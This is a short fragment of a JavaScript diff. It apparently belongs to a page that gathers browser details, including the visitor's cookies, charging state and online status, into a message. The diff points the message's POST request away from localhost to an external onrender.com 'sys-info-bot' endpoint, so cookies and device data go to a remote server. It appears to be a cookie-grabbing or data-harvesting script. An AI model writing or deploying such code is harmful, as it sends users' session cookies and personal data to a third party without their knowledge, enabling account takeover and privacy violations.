@@ -175,9 +175,9 @@ Charging: ${info.charging}
 Cookies: ${info.cookies}
 Online: ${info.online}
         `;
-
+       //https://system-info-terminal.onrender.com
         try {
-          await fetch('http://localhost:3000/send-message', {
+          await fetch('https://sys-info-bot.onrender.com/send-message', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ message })
